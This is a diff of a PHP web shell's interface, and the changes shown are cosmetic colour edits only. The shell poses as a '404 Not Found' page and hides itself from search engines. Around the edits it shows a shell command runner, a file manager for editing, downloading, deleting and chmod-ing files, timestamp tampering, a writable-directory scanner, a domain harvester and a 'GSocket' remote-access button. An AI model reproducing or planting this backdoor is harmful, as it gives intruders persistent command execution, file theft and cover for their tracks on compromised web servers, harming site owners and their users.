@@ -180,19 +180,18 @@ $_hascmd=function_exists('system')||function_exists('exec')||function_exists('sh
 <html><head><title>404 Not Found</title><meta name="robots" content="noindex,nofollow,noarchive,nosnippet">
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:monospace;font-size:13px}
-body{background:#2a0f0f;color:#e2e8f0}a{color:#38bdf8;text-decoration:none}
+body{background:#2a0f0f;color:#e2e8f0}a{color:#001aff;text-decoration:none}
 .w{max-width:1200px;margin:0 auto;padding:10px}
 .b{background:#000000;padding:8px 12px;border-radius:6px;margin-bottom:8px;display:flex;gap:8px;align-items:center;flex-wrap:wrap}
 input[type=text],input[type=file],select{background:#2a0f0f;border:1px solid #553333;color:#fff;padding:5px 8px;border-radius:4px;font-family:monospace;font-size:13px}
 button,input[type=submit]{background:#ff0000;color:#fff;border:none;padding:5px 12px;border-radius:4px;cursor:pointer;font-family:monospace;font-size:13px}
-button:hover{background:#ff6b81}
 table{width:100%;border-collapse:collapse}th{background:#000000;padding:6px 10px;text-align:left;border-bottom:2px solid #ff0000}
 td{padding:4px 10px;border-bottom:1px solid #ffffff}tr:hover{background:#000000}
 .s{color:#ffffff}.m{background:#0a3d62;padding:8px;border-radius:4px;margin-bottom:8px;color:#0dff00}
 textarea{width:100%;height:400px;background:#2a0f0f;color:#e2e8f0;border:1px solid #553333;padding:8px;font-family:monospace;border-radius:4px}
 .ab{background:#553333;border:none;cursor:pointer;padding:3px 8px;border-radius:3px;font-size:12px;color:#e2e8f0;font-family:monospace}
 .ab:hover{background:#ff0000;color:#fff}
-.prog{display:none;color:#38bdf8;font-size:11px}
+.prog{display:none;color:#001aff;font-size:11px}
 </style>
 <script>
 function b64e(s){return btoa(unescape(encodeURIComponent(s)));}
@@ -305,23 +304,23 @@ function navDir(dir){
 <div class="b">
     <b style="color:#ff0000">FM</b>
     <form method="post" onsubmit="document.getElementById('_pb').value=btoa(document.getElementById('_pv').value);return true;" style="display:flex;gap:5px;flex:1">
-        <input type="text" id="_pv" value="<?=htmlspecialchars($dir)?>" style="flex:1;min-width:200px;color:<?=$_dirwr?'#22c55e':'#ef4444'?>;font-weight:bold">
+        <input type="text" id="_pv" value="<?=htmlspecialchars($dir)?>" style="flex:1;min-width:200px;color:<?=$_dirwr?'#1eff00':'#ff0000'?>;font-weight:bold">
         <input type="hidden" name="_pb" id="_pb">
         <button name="_go" value="1">Go</button>
     </form>
     <div style="display:flex;gap:5px">
         <input type="text" id="_cmdv" placeholder="$ command" style="min-width:180px" onkeydown="if(event.key=='Enter')doCmd()">
-        <button onclick="doCmd()" style="background:#8b5cf6">Run</button>
+        <button onclick="doCmd()" style="background:#ff0000">Run</button>
     </div>
 </div>
 <div id="scanwr_box" class="b" style="display:<?=$act=='scanwr'?'flex':'none'?>;gap:5px;align-items:center">
-    <span style="color:#10b981;font-weight:bold">Scan:</span>
+    <span style="color:#1eff00;font-weight:bold">Scan:</span>
     <input type="text" id="_wrpath" value="<?=isset($_POST['_sp'])?htmlspecialchars(base64_decode($_POST['_sp'])):'/var/www/'?>" placeholder="/path/to/scan" style="flex:1" onkeydown="if(event.key=='Enter')doScanWr()">
-    <button onclick="doScanWr()" style="background:#10b981">Scan</button>
+    <button onclick="doScanWr()" style="background:#1eff00">Scan</button>
 </div>
 <?php if(isset($msg)):?><div class="m"><?=$msg?></div><?php endif;?>
 <div class="b" style="color:#ffffff;font-size:11px">
-    <?=$_user?> | <span style="color:<?=$_dirwr?'#22c55e':'#ef4444'?>;font-weight:bold"><?=$_dirwr?'WRITABLE':'READ-ONLY'?></span> | PHP <?=phpversion()?> | <?=$_hascmd?'CMD:ON':'CMD:OFF'?>
+    <?=$_user?> | <span style="color:<?=$_dirwr?'#1eff00':'#ff0000'?>;font-weight:bold"><?=$_dirwr?'WRITABLE':'READ-ONLY'?></span> | PHP <?=phpversion()?> | <?=$_hascmd?'CMD:ON':'CMD:OFF'?>
 </div>
 
 <?php if($cmd_out):?>
@@ -334,10 +333,10 @@ $_p=@proc_open('find '.escapeshellarg($_sp).' -writable -type d 2>/dev/null | he
 $_wr_out='';if(is_resource($_p)){fclose($_pipes[0]);$_wr_out=stream_get_contents($_pipes[1]);fclose($_pipes[1]);fclose($_pipes[2]);proc_close($_p);}
 $_wr_dirs=array_filter(array_map('trim',explode("\n",$_wr_out)));
 ?>
-<div style="background:#0a1a0a;border:1px solid #10b981;border-radius:4px;padding:8px;margin-bottom:8px">
-<div style="color:#10b981;font-size:11px;margin-bottom:6px"><b><?=count($_wr_dirs)?> writable dirs</b> in <?=htmlspecialchars($_sp)?></div>
+<div style="background:#0a1a0a;border:1px solid #1eff00;border-radius:4px;padding:8px;margin-bottom:8px">
+<div style="color:#1eff00;font-size:11px;margin-bottom:6px"><b><?=count($_wr_dirs)?> writable dirs</b> in <?=htmlspecialchars($_sp)?></div>
 <?php if($_wr_dirs):foreach($_wr_dirs as $_wd){$_wpm=@substr(sprintf('%o',fileperms($_wd)),-4);$_wow=function_exists('posix_getpwuid')?@posix_getpwuid(fileowner($_wd))['name']:fileowner($_wd);$_wgr=function_exists('posix_getgrgid')?@posix_getgrgid(filegroup($_wd))['name']:filegroup($_wd);
-echo "<div style='padding:2px 0'><a href=\"javascript:navDir('"._e($_wd)."')\" style='color:#22c55e;font-size:12px'>&#128193; ".htmlspecialchars($_wd)."</a> <span style='color:#ffffff;font-size:11px'>$_wow:$_wgr $_wpm</span></div>";}
+echo "<div style='padding:2px 0'><a href=\"javascript:navDir('"._e($_wd)."')\" style='color:#1eff00;font-size:12px'>&#128193; ".htmlspecialchars($_wd)."</a> <span style='color:#ffffff;font-size:11px'>$_wow:$_wgr $_wpm</span></div>";}
 else:?><div style="color:#ffffff">No writable dirs found</div><?php endif;?>
 </div>
 
@@ -374,16 +373,16 @@ ksort($doms);$np=0;foreach($doms as $_di)if(!empty($_di['p'])&&@is_dir($_di['p']
 <table><tr><th>#</th><th>Domain</th><th>Document Root</th><th>Source</th></tr>
 <?php $n=0;foreach($doms as $dm=>$inf){$n++;$hp=!empty($inf['p'])&&@is_dir($inf['p']);
 echo "<tr><td class='s'>$n</td><td>";
-if($hp)echo "<a href=\"javascript:navDir('"._e($inf['p'])."')\" style='color:#38bdf8'>".htmlspecialchars($dm)." &rarr;</a>";
+if($hp)echo "<a href=\"javascript:navDir('"._e($inf['p'])."')\" style='color:#001aff'>".htmlspecialchars($dm)." &rarr;</a>";
 else echo "<span class='s'>".htmlspecialchars($dm)."</span>";
-echo "</td><td class='s'>".($hp?"<span style='color:#22c55e'>".htmlspecialchars($inf['p'])."</span>":htmlspecialchars($inf['p']??'-'))."</td><td class='s'>".htmlspecialchars($inf['s'])."</td></tr>";}?>
+echo "</td><td class='s'>".($hp?"<span style='color:#1eff00'>".htmlspecialchars($inf['p'])."</span>":htmlspecialchars($inf['p']??'-'))."</td><td class='s'>".htmlspecialchars($inf['s'])."</td></tr>";}?>
 </table>
 <?php else:?><div class="b"><span class="s">No domains found</span></div><?php endif;?>
 
 <?php elseif($act=='edit'&&$file&&is_file($file)):?>
 <div class="b" style="justify-content:space-between">
     <b>Edit: <?=htmlspecialchars(basename($file))?> <span class="s">(<?=filesize($file)?>B)</span></b>
-    <a href="javascript:navDir('<?=_e($dir)?>')" style="background:#38bdf8;color:#fff;padding:4px 12px;border-radius:3px">&larr; Back</a>
+    <a href="javascript:navDir('<?=_e($dir)?>')" style="background:#001aff;color:#fff;padding:4px 12px;border-radius:3px">&larr; Back</a>
 </div>
 <form method="post" onsubmit="return doSave()">
     <input type="hidden" name="_a" value="save">
@@ -393,7 +392,7 @@ echo "</td><td class='s'>".($hp?"<span style='color:#22c55e'>".htmlspecialchars(
     <textarea id="editor"><?=htmlspecialchars(file_get_contents($file))?></textarea>
     <div style="margin-top:5px;display:flex;gap:5px">
         <button type="submit">Save</button>
-        <a href="javascript:navDir('<?=_e($dir)?>')" style="background:#38bdf8;color:#fff;padding:4px 10px;border-radius:3px;display:inline-flex;align-items:center">&larr; Back</a>
+        <a href="javascript:navDir('<?=_e($dir)?>')" style="background:#001aff;color:#fff;padding:4px 10px;border-radius:3px;display:inline-flex;align-items:center">&larr; Back</a>
     </div>
 </form>
 
@@ -410,27 +409,27 @@ echo "</td><td class='s'>".($hp?"<span style='color:#22c55e'>".htmlspecialchars(
     <input type="file" id="uf">
     <button onclick="doUpload()">Upload</button>
     <span id="prog" class="prog"></span>
-    <button onclick="doMkdir('<?=_e($dir)?>')" style="background:#38bdf8">Mkdir</button>
+    <button onclick="doMkdir('<?=_e($dir)?>')" style="background:#001aff">Mkdir</button>
     <button onclick="doMkfile('<?=_e($dir)?>')" style="background:#0ea5e9">New File</button>
     <button onclick="doAction('grab','','<?=_e($dir)?>')" style="background:#0a84ff">Grab Domains</button>
     <button onclick="doGsocket()" style="background:#f59e0b;color:#000">GSocket</button>
-    <button onclick="var e=document.getElementById('scanwr_box');e.style.display=e.style.display=='none'?'flex':'none'" style="background:#10b981">Scan Writable</button>
+    <button onclick="var e=document.getElementById('scanwr_box');e.style.display=e.style.display=='none'?'flex':'none'" style="background:#1eff00">Scan Writable</button>
 </div>
 <table><tr><th>Name</th><th>Size</th><th>Owner</th><th>Perms</th><th>Modified</th><th style="min-width:180px">Actions</th></tr>
 <?php
 if($dir!='/'){$par=dirname($dir);
-echo "<tr><td colspan=5><a href=\"javascript:navDir('"._e($par)."')\" style='color:#38bdf8'>&#128193; ..</a></td></tr>";}
+echo "<tr><td colspan=5><a href=\"javascript:navDir('"._e($par)."')\" style='color:#001aff'>&#128193; ..</a></td></tr>";}
 $items=@scandir($dir);if($items){$ds=$fs=[];foreach($items as $it){if($it=='.'||$it=='..')continue;$p=$dir.'/'.$it;if(is_dir($p))$ds[]=$it;else $fs[]=$it;}sort($ds);sort($fs);
 foreach($ds as $it){$p=$dir.'/'.$it;$pm=@substr(sprintf('%o',fileperms($p)),-4);$mt=@date('d-m-Y H:i',filemtime($p));$wr=is_writable($p);$ow=function_exists('posix_getpwuid')?posix_getpwuid(fileowner($p))['name']:fileowner($p);$gr=function_exists('posix_getgrgid')?posix_getgrgid(filegroup($p))['name']:filegroup($p);
-echo "<tr><td><a href=\"javascript:navDir('"._e($p)."')\" style='color:".($wr?"#38bdf8":"#ef4444")."'>&#128193; ".htmlspecialchars($it)."</a></td>";
-echo "<td class='s'>DIR</td><td class='s'>$ow:$gr</td><td style='color:".($wr?"#22c55e":"#ef4444")."'>$pm</td><td class='s'>$mt</td><td>";
+echo "<tr><td><a href=\"javascript:navDir('"._e($p)."')\" style='color:".($wr?"#001aff":"#ff0000")."'>&#128193; ".htmlspecialchars($it)."</a></td>";
+echo "<td class='s'>DIR</td><td class='s'>$ow:$gr</td><td style='color:".($wr?"#1eff00":"#ff0000")."'>$pm</td><td class='s'>$mt</td><td>";
 echo "<button class='ab' onclick=\"doRename('"._e($p)."','"._e($dir)."')\">Ren</button> ";
 echo "<button class='ab' onclick=\"doChmod('"._e($p)."','"._e($dir)."','$pm')\">Chm</button> ";
 echo "<button class='ab' onclick=\"doAction('chtime','"._e($p)."','"._e($dir)."')\">ChT</button> ";
 echo "<button class='ab' onclick=\"doDel('"._e($p)."','"._e($dir)."','".htmlspecialchars($it)."')\">Del</button>";
 echo "</td></tr>";}
 foreach($fs as $it){$p=$dir.'/'.$it;$sz=@filesize($p);$s=$sz>1048576?round($sz/1048576,1).'M':($sz>1024?round($sz/1024,1).'K':$sz.'B');$pm=@substr(sprintf('%o',fileperms($p)),-4);$mt=@date('d-m-Y H:i',filemtime($p));$wr=is_writable($p);$ow=function_exists('posix_getpwuid')?posix_getpwuid(fileowner($p))['name']:fileowner($p);$gr=function_exists('posix_getgrgid')?posix_getgrgid(filegroup($p))['name']:filegroup($p);
-echo "<tr><td>&#128196; <span style='color:".($wr?"#e2e8f0":"#ef4444")."'>".htmlspecialchars($it)."</span></td><td class='s'>$s</td><td class='s'>$ow:$gr</td><td style='color:".($wr?"#22c55e":"#ef4444")."'>$pm</td><td class='s'>$mt</td><td>";
+echo "<tr><td>&#128196; <span style='color:".($wr?"#e2e8f0":"#ff0000")."'>".htmlspecialchars($it)."</span></td><td class='s'>$s</td><td class='s'>$ow:$gr</td><td style='color:".($wr?"#1eff00":"#ff0000")."'>$pm</td><td class='s'>$mt</td><td>";
 echo "<button class='ab' onclick=\"doAction('edit','"._e($p)."','"._e($dir)."')\">Edit</button> ";
 echo "<a href='?_a=dl&_f="._e($p)."' class='ab' style='text-decoration:none;display:inline-block'>DL</a> ";
 echo "<button class='ab' onclick=\"doRename('"._e($p)."','"._e($dir)."')\">Ren</button> ";
